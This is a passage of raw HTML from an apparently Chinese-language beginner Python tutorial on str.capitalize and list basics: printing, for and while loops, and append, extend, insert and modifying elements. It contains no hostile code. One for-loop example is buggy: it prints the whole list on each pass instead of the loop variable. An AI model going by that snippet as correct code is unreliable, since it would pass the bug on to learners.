class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre><span class=\"token number\">11</span><span class=\"token punctuation\">,</span>capitalize</pre></td></tr><tr><td data-num=\"123\"></td><td><pre>把字符串的第一个字符大写</pre></td></tr><tr><td data-num=\"124\"></td><td><pre>mystr<span class=\"token punctuation\">.</span>capitalize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>str01 <span class=\"token operator\">=</span> <span class=\"token string\">'hello python ha ha'</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>str02 <span class=\"token operator\">=</span> str01<span class=\"token punctuation\">.</span>capitalize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str02<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># Hello python ha ha</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr></table></figure><h3 id=\"列表\"><a class=\"markdownIt-Anchor\" href=\"#列表\">#</a> <span class=\"label success\">列表</span></h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>前面学习的字符串可以用来存储一串信息，那么想一想，怎样存储咱们班所有同学的名字呢？</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>定义<span class=\"token number\">100</span>个变量，每个变量存放一个学生的姓名可行吗？有更好的办法吗？</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>列表的格式</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>namesList <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'xiaoWang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'xiaoZhang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'xiaoHua'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>比C语言的数组强大的地方在于列表中的元素可以是不同类型的</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>testList <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>打印列表</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>namesList <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'xiaoWang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'xiaoZhang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'xiaoHua'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>namesList<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>namesList<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>namesList<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>xiaoWang</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>xiaoZhang</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>xiaoHua</pre></td></tr></table></figure><h4 id=\"列表的循环遍历列表的循环遍历\"><a class=\"markdownIt-Anchor\" href=\"#列表的循环遍历列表的循环遍历\">#</a> <span>列表的循环遍历</span> [<span class=\"label success\">列表的循环遍历</span></h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>使用<span class=\"token keyword\">for</span>循环</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>为了更有效率的输出列表的每个数据，可以使用循环来完成</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小明\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小红\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">76</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> names <span class=\"token keyword\">in</span> name<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>使用<span class=\"token keyword\">while</span>循环</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小明\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小红\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">76</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>z <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">while</span> z<span class=\"token operator\">&lt;</span>i<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">[</span>z<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    z<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr></table></figure><h4 id=\"列表的相关操作\"><a class=\"markdownIt-Anchor\" href=\"#列表的相关操作\">#</a> <span class=\"label success\">列表的相关操作</span></h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>列表中存放的数据是可以进行修改的，比如增、删、改</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">></span>添加元素<span class=\"token punctuation\">(</span><span class=\"token string\">\"增\"</span>append<span class=\"token punctuation\">,</span> extend<span class=\"token punctuation\">,</span> insert<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>append</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>通过append可以向列表添加元素</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"小红\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小明\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小刚\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'小红'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'小明'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'小刚'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>name<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">\"迪迦\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'小红'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'小明'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'小刚'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'迪迦'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>extend</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>通过extend可以将另一个集合中的元素逐一添加到列表中</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"小红\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小明\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小刚\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>password <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span><span class=\"token number\">456</span><span class=\"token punctuation\">,</span><span class=\"token number\">789</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>password<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">456</span><span class=\"token punctuation\">,</span> <span class=\"token number\">789</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'小红'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'小明'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'小刚'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>insert</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>insert<span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> <span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span> 在指定位置index前插入元素<span class=\"token builtin\">object</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"小红\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小明\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小刚\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>name<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小李\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'小红'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'小李'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'小明'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'小刚'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token operator\">></span>修改元素<span class=\"token punctuation\">(</span><span class=\"token string\">\"改\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>修改元素的时候，要通过下标来确定要修改的是哪个元素，然后才能进行修改</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"啦啦啦\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"哈哈哈\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"呵呵呵\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">for</span> zxc <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------更改之前-------------\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>啦啦啦</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>哈哈哈</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>呵呵呵</pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>更改之前<span class=\"token operator\">-</span><span 